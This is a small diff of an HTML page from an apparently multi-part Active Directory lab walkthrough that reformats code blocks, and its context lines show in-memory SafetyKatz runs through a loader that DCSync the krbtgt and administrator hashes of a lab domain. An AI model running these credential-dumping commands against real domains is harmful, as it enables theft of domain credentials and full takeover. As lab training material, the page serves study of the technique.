@@ -282,7 +282,7 @@ ArgSplit.bat
 
 <p>Let’s now run SafetyKatz into the memory using our dotnet Loader and dump the KRGTGT and Administrator’s hashes.
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit”
-<pre><code>mimikatz(commandline) # lsadump::dcsync /user:us\krbtgt
+<pre><code class="language-bash">mimikatz(commandline) # lsadump::dcsync /user:us\krbtgt
 [DC] 'us.techcorp.local' will be the domain
 [DC] 'US-DC.us.techcorp.local' will be the DC server
 [DC] 'us\krbtgt' will be the user account
@@ -361,7 +361,7 @@ mimikatz(commandline) # exit
 </code></pre>
 
 <p>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\administrator" "exit"
-<pre><code>mimikatz(commandline) # lsadump::dcsync /user:us\administrator
+<pre><code class="language-bash">mimikatz(commandline) # lsadump::dcsync /user:us\administrator
 [DC] 'us.techcorp.local' will be the domain
 [DC] 'US-DC.us.techcorp.local' will be the DC server
 [DC] 'us\administrator' will be the user account
@@ -431,7 +431,7 @@ mimikatz(commandline) # exit
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-18-domain-persistence-sapphire-ticket-attack.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Domain Persistence - Sapphire </a>
             <a href="part-20-cross-domain-attacks-active-directory-certificate.html">Next: Cross Domain Attacks - Active  <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
